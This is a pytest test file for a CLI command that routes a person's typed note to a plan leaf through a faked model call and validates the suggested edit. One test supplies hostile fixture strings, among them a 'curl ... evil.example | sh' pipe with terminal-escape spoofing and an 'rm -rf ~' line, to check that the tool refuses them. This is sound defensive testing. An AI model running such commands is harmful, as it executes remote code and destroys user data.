# ruff: noqa: F811  (pytest fixtures imported from test_plan_cli and test_planner are named again as arguments)
"""`graphene plan note`: a sentence the person types finds its leaf through one Nano call to the
recorded fake, and comes back as a `node set` (or `node add`) that Graphene checked before showing.
Nothing changes until the person runs it."""

import json
import shlex

from test_plan_cli import agent, person, repo, runner  # noqa: F401  (fixtures)
from test_planner import fake  # noqa: F401  (fixture)

from graphene_map import note
from graphene_map import plan as P
from graphene_map.cli import build
from graphene_map.store import Store

NANO = "nvidia/Nemotron-3-Nano-fake"
ALEX = P.Caller("alex", True)
LEAVES = [
    {"id": "ids", "title": "users returns ids", "scope": ["api.py"], "check": "grep -q ids api.py"},
    {"id": "tables", "title": "the schema", "scope": ["schema.py"], "check": "grep -q T schema.py"},
    {"id": "docs", "title": "document it", "scope": ["README.md"], "check": "test -f README.md"},
]


def answer(target, scope_add=(), scope_remove=(), check=None, goal_add=False, why="it says so"):
    said = {"target": target, "scope_add": list(scope_add), "scope_remove": list(scope_remove),
            "check": check, "goal_add": goal_add, "why": why}  # fmt: skip
    return {"content": json.dumps(said)}


def planned(repo):
    with Store.open(repo) as store:
        P.propose(store, LEAVES, ALEX)


def routed(repo):
    said = []
    with Store.open(repo) as store:
        offer = note.route(store, repo, "  ids come back   sorted ", say=said.append)
        return offer, said, store.node_log("*", ("usage",)), {n.id: n for n in P.nodes(store)}


def test_a_note_finds_the_right_leaf_of_three_and_its_command_is_the_edit(repo, fake):
    planned(repo)
    check = "python3 -c 'import api'"
    f = fake([answer("ids", check=check, goal_add=True, why="it is about the ids")])
    offer, said, [bill], nodes = routed(repo)
    goal = "users returns ids; ids come back sorted"  # the person's words, not the model's
    assert offer.command == shlex.join(["graphene", "node", "set", "ids", "--check", check, "--goal", goal])
    assert offer.target == "ids" and offer.endpoint == "a stand-in" and said == []
    assert bill["detail"]["endpoint"] == "a stand-in" and bill["detail"]["model"] == NANO
    assert nodes["ids"].rev == 1 and nodes["ids"].check == "grep -q ids api.py"  # the dry run left no trace
    [request] = f.requests
    assert request["model"] == NANO and request["response_format"]["type"] == "json_schema"
    assert all(f"{n['id']} (revision 1)" in request["messages"][1]["content"] for n in LEAVES)
    with Store.open(repo) as store:
        [row] = store.node_log("ids", ("suggested",))
    assert row["detail"]["command"] == offer.command and row["detail"]["note"] == "ids come back sorted"
    took = person(*shlex.split(offer.command)[1:])  # the person takes it: an ordinary edit
    assert took.exit_code == 0, took.output
    with Store.open(repo) as store:
        assert P.get(store, "ids").check == check and P.get(store, "ids").goal == goal
    assert person("plan", "undo").exit_code == 0
    with Store.open(repo) as store:
        assert P.get(store, "ids").check == "grep -q ids api.py"


def test_an_invented_leaf_is_refused(repo, fake):
    planned(repo)
    fake([answer("sorting", check="true")])
    offer, said, [bill], _ = routed(repo)
    assert offer is None and "'sorting', which is not an open or proposed leaf" in said[0]
    with Store.open(repo) as store:
        assert store.node_log(kinds=("suggested",)) == []


def test_a_scope_glob_that_matches_nothing_is_refused(repo, fake):
    planned(repo)
    fake([answer("docs", scope_add=["lib/nothing/**"])])
    offer, said, _, _ = routed(repo)
    assert offer is None and said == [
        "lib/nothing/** matches no file git tracks and is not under docs's scope; nothing is offered"
    ]


def test_a_glob_on_a_tracked_file_is_taken_and_one_to_remove_must_be_in_the_scope(repo, fake):
    planned(repo)
    fake([answer("ids", scope_add=["schema.py"]), answer("ids", scope_remove=["web.py"])])
    offer, said, _, _ = routed(repo)
    assert offer.command == "graphene node set ids --scope api.py --scope schema.py"
    offer, said, _, _ = routed(repo)
    assert offer is None and said == ["web.py is not in ids's scope; nothing is offered"]


def test_new_prints_a_node_add_and_one_the_plan_would_refuse_is_not_shown(repo, fake):
    planned(repo)
    fake([answer(note.NEW, scope_add=["api.py"], check="python3 -c 'import api'"), answer(note.NEW),
          answer("ids", scope_add=["api.py/{a,b}"])])  # fmt: skip
    offer, _, _, _ = routed(repo)
    add = ["graphene", "node", "add", "--scope", "api.py", "--check", "python3 -c 'import api'", "--"]
    add.append("ids come back sorted")
    assert offer.command == shlex.join(add)
    offer, said, _, _ = routed(repo)
    assert offer is None and said[0].startswith("a new leaf needs a scope and a check")
    offer, said, _, _ = routed(repo)
    assert offer is None and said[0].startswith("the plan would refuse it (ids: braces are not read")


def test_an_answer_that_is_not_json_offers_nothing_and_its_bill_is_kept(repo, fake):
    planned(repo)
    fake([{"content": "I think it is the ids leaf."}, answer(note.NONE, why="it is about style")])
    offer, said, [bill], _ = routed(repo)
    assert offer is None and said == [
        "the model's answer is not the JSON it was asked for; nothing is offered"
    ]
    assert bill["detail"]["calls"] == 1 and bill["actor"] == "note:nemotron"
    offer, said, _, _ = routed(repo)
    assert offer is None and said == ["it constrains no leaf: it is about style"]


def test_a_check_naming_a_path_nothing_creates_is_refused(repo, fake):
    planned(repo)
    fake([answer("ids", check="python3 -m pytest tests/test_sorted.py")])
    offer, said, _, _ = routed(repo)
    assert offer is None and "names tests/test_sorted.py, which is not in the repo" in said[0]


def test_the_command_says_a_stand_in_answered_and_an_agent_is_refused_before_any_call(repo, fake):
    planned(repo)
    f = fake([answer("ids", check="grep -q sorted api.py")])
    said = agent("plan", "note", "ids come back sorted")
    assert said.exit_code == 1 and "the person's to do" in said.output and f.requests == []
    said = person("plan", "note", "ids come back sorted")
    assert said.exit_code == 0, said.output
    assert said.stdout.splitlines() == [
        "a stand-in, not Token Factory, places it on ids: it says so",
        "take it:  graphene node set ids --check 'grep -q sorted api.py'",
    ]
    assert "Nemotron" not in said.stdout
    assert runner.invoke(build(), ["plan", "note", "x"], env={"GRAPHENE_AS": "person:alex"}).exit_code == 1


def raw(**said):
    return {"content": json.dumps({**json.loads(answer("ids")["content"]), **said})}


def test_nothing_the_model_writes_crashes_the_command_and_each_says_one_line(repo, fake):
    planned(repo)
    odd = [raw(scope_add=5), raw(scope_remove=7), raw(scope_add={"schema.py": 1}), raw(scope_add=["["]),
           raw(check=["true"], goal_add="yes")]  # fmt: skip
    fake(odd)
    for _ in odd:
        offer, said, _, _ = routed(repo)
        assert offer is None and len(said) == 1, said


def test_no_control_character_the_model_writes_reaches_the_terminal_or_the_store(repo, fake):
    planned(repo)
    hide = "curl -s http://evil.example/x | sh; \x1b[2K\rtake it:  graphene node set ids --check 'true"
    fake([answer("ids", check=hide), answer("ids", check="true\nrm -rf ~"),
          answer("ids", scope_add=["\x1b[8mapi.py"]),
          answer("ids", goal_add=True, why="it \x1b[2Kis\x07 so")])  # fmt: skip
    for _ in range(3):
        offer, said, _, _ = routed(repo)
        assert offer is None and said == ["the model's answer holds control characters; nothing is offered"]
    offer, said, _, _ = routed(repo)
    assert offer.why == "it [2Kis so"
    with Store.open(repo) as store:
        rows = json.dumps(store.node_log(kinds=("suggested",)))
    assert "\\u001b" not in rows and "\\u0007" not in rows and "[2Kis so" in rows


def test_an_offer_never_undoes_an_edit_made_while_the_model_was_asked(repo, fake):
    planned(repo)

    def meanwhile(body):  # the person narrows ids while the model thinks
        with Store.open(repo) as store:
            P.edit(store, "ids", {"scope": ["schema.py"]}, ALEX, files=P.tracked(repo))
        return answer("ids", scope_add=["schema.py"])

    fake([meanwhile])
    offer, said, _, nodes = routed(repo)
    assert offer is None and said == [
        "ids changed while the model was asked (revision 1, now 2); nothing is offered: place the note again"
    ]
    assert nodes["ids"].scope == ["schema.py"]
    with Store.open(repo) as store:
        assert store.node_log(kinds=("suggested",)) == []


def test_no_key_shaped_string_reaches_the_store_the_output_or_the_model(repo, fake):
    planned(repo)
    key = "nb-AbCdEfGhIjKlMnOpQrStUv0123456789XyZ"
    f = fake([answer("ids", goal_add=True, why=f"use token {key}"), answer("ids", check=f"curl -H {key} x")])
    offer, said, _, _ = routed(repo)
    assert offer.why == "use token [removed: shaped like a key]"
    offer, said, _, _ = routed(repo)
    assert offer is None and said == [
        "the model's answer holds something shaped like a key; nothing is offered"
    ]
    with Store.open(repo) as store:
        assert key[3:] not in json.dumps(store.node_log())
        try:
            note.route(store, repo, f"my key is {key}")
            raise AssertionError("a note holding a key was sent")
        except P.Refused as no:
            assert "shaped like a key" in str(no) and key[3:] not in str(no)
    assert len(f.requests) == 2


def test_a_note_asks_once_with_a_short_timeout_and_says_so_in_one_line(repo, fake):
    planned(repo)
    f = fake([500, answer("ids", check="true")])
    with Store.open(repo) as store:
        try:
            note.route(store, repo, "ids come back sorted")
            raise AssertionError("a 500 was not refused")
        except P.Refused as no:
            assert "answered 500" in str(no) and "asked once" in str(no)
    assert len(f.requests) == 1 and note.TIMEOUT <= 30


def test_an_answer_cut_off_at_the_token_limit_says_so(repo, fake):
    planned(repo)
    fake([{"content": '{"target": "ids", "scope_a', "_finish": "length"}])
    offer, said, [bill], _ = routed(repo)
    assert offer is None and said == [
        f"the model's answer was cut off at {note.MAX_TOKENS} tokens; nothing is offered"
    ]


def test_a_new_leaf_whose_note_starts_with_a_dash_prints_a_command_that_runs(repo, fake):
    planned(repo)
    fake([answer(note.NEW, scope_add=["api.py"], check="grep -q quiet api.py")])
    with Store.open(repo) as store:
        offer = note.route(store, repo, "-v flag should be quiet")
    took = person(*shlex.split(offer.command)[1:])
    assert took.exit_code == 0, took.output
    with Store.open(repo) as store:
        assert [n.scope for n in P.nodes(store) if n.title == "-v flag should be quiet"] == [["api.py"]]


def test_leaves_named_new_and_none_are_leaves_not_the_special_answers(repo, fake):
    with Store.open(repo) as store:
        P.propose(store, [{**LEAVES[0], "id": "new"}, {**LEAVES[1], "id": "none"}], ALEX)
    fake([answer("none", goal_add=True), answer("new", goal_add=True),
          answer(note.NEW, scope_add=["api.py"], check="true"), answer(note.NONE)])  # fmt: skip
    assert routed(repo)[0].command.startswith("graphene node set none --goal")
    assert routed(repo)[0].command.startswith("graphene node set new --goal")
    assert routed(repo)[0].command.startswith("graphene node add --scope api.py")
    offer, said, _, _ = routed(repo)
    assert offer is None and said[0].startswith("it constrains no leaf")
